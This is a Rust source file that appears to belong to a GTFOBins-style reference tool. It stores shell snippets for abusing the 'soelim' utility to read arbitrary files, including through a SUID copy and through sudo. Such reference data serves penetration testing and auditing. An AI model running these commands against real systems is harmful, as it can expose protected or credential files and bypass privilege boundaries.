pub static BIN_NAME: &'static str = "soelim";
pub static BIN_DESC: &'static str = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    soelim "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which soelim) .

    LFILE=file_to_read
    ./soelim "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo soelim "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
